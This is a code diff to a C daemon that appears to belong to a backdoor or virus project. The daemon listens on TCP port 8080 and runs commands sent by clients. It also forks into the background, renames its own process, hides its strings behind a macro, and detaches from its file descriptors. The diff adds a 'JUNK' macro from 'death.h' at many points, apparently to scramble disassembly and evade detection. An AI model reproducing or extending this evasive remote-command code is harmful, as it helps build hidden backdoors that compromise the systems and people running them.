@@ -6,6 +6,7 @@
 
 #include "daemon.h"
 #include "utils.h"
+#include "death.h"
 #include "syscall.h"
 
 #define CLOSE_END 0
@@ -42,6 +43,8 @@ static int create_server(void)
 		return -1;
 	}
 
+	JUNK;
+
 	struct sockaddr_in addr = {
 		.sin_family = AF_INET,
 		.sin_port = my_htons(8080),
@@ -53,20 +56,19 @@ static int create_server(void)
 		return -1;
 	}
 
+	JUNK;
+
 	if (bind(fd, &addr, sizeof(addr)) < 0) {
 		close(fd);
 		return -1;
 	}
 
+	JUNK;
+
 	if (listen(fd, 0) < 0) {
 		close(fd);
 		return -1;
 	}
-
-	//if (fcntl(fd, F_SETFL, O_NONBLOCK) == -1) {
-	//	close(fd);
-	//	return -1;
-	//}
 
 	return fd;
 }
@@ -75,6 +77,8 @@ static int accept_client(int fd)
 {
 	struct sockaddr_in addr;
 	socklen_t addr_len = sizeof(addr);
+
+	JUNK;
 
 	int client_fd = accept(fd, &addr, &addr_len);
 	if (client_fd == -1) {
@@ -130,6 +134,8 @@ command_func_t get_command(const char *cmd)
 		{NULL, unknown}
 	};
 
+	JUNK;
+
 	for (int i = 0; commands[i].name != NULL; i++) {
 		if (ft_strcmp(commands[i].name, cmd) == 0) {
 			return commands[i].func;
@@ -147,6 +153,8 @@ static void poller(int fd, char **envp)
 	char buf[256];
 	int ret = 0;
 
+	JUNK;
+
 	while (1) {
 
 		if (use_client < MAX_CLIENTS) {
@@ -157,6 +165,8 @@ static void poller(int fd, char **envp)
 			}
 			use_client++;
 		}
+
+		JUNK;
 
 		buf[0] = '\0';
 		ret = read(client_fd, buf, sizeof(buf));
@@ -170,6 +180,8 @@ static void poller(int fd, char **envp)
 			close(client_fd);
 			continue;
 		}
+
+		JUNK;
 
 		buf[ret] = '\0';
 		if (buf[ret - 1] == '\n') {
@@ -188,75 +200,6 @@ static void poller(int fd, char **envp)
 
 	}
 }
-
-//static void poller(int fd, char **envp)
-//{
-//	struct pollfd fds[MAX_CLIENTS + 1];
-//	fds[0].fd = fd;
-//	fds[0].events = POLLIN;
-//
-//	for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-//		fds[i].fd = -1;
-//	}
-//
-//	int use_client = 0;
-//
-//	while (1) {
-//		if (poll(&fds, use_client + 1, -1) == -1) {
-//			break;
-//		}
-//
-//		if (fds[0].revents & POLLIN) {
-//			if (use_client == MAX_CLIENTS) {
-//				logger(STR("max clients\n"));
-//				continue;
-//			}
-//
-//			int client_fd = accept_client(fd);
-//
-//			if (client_fd != -1) {
-//				for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-//					if (fds[i].fd == -1) {
-//						fds[i].fd = client_fd;
-//						fds[i].events = POLLIN;
-//						use_client++;
-//						logger(STR("new client\n"));
-//						break;
-//					}
-//				}
-//			}
-//		}
-//
-//		for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-//			if (fds[i].fd == -1 || (fds[i].revents & POLLIN) == 0) 
-//				continue;
-//			else {
-//				char buf[1024];
-//				int ret = read(fds[i].fd, buf, sizeof(buf));
-//				if (ret <= 0) {
-//					close(fds[i].fd);
-//					fds[i].fd = -1;
-//					use_client--;
-//					logger(STR("client disconnected\n"));
-//				}
-//				else {
-//					buf[ret] = '\0';
-//					if (buf[ret - 1] == '\n') {
-//						buf[ret - 1] = '\0';
-//					}
-//					param_t command = {
-//						.client_fd = fds[i].fd,
-//						.envp = envp
-//					};
-//					command_func_t func = get_command(buf);
-//					if (func != NULL) {
-//						func(&command);
-//					}
-//				}
-//			}
-//		}
-//	}
-//}
 
 static int lock(int *lock_fd, int close_end)
 {
@@ -306,6 +249,7 @@ static int unlock(int *lock_fd)
 void run(int *lock_fd, char **envp)
 {
 	//signal_init();
+	JUNK;
 
 	int server_fd = create_server();
 	if (server_fd == -1) {
@@ -336,6 +280,8 @@ static int attach_to_devnull(void)
 	if (dup2(fd, STDIN_FILENO) < 0) {
 		return -1;
 	}
+
+	JUNK;
 
 	close(fd);
 
@@ -380,11 +326,7 @@ int	daemonize(char **envp)
 		return -1;
 	}
 
-
-	//if (setpgid(0, 0) == -1) {
-	//	logger(STR("setpgid failed\n"));
-	//	return -1;
-	//}
+	JUNK;
 
 	pid = fork();
 	if (pid < 0)
@@ -396,15 +338,11 @@ int	daemonize(char **envp)
 	prctl(PR_SET_NAME, name);
 	
 	close_fds();
-	//close(0);
-	//close(1);
-	//close(2);
 
 	if (attach_to_devnull() == -1) {
 		return -1;
 	}
 
-	//setpgid(0, 0);
 	chdir(STR("/"));
 	umask(0);
 
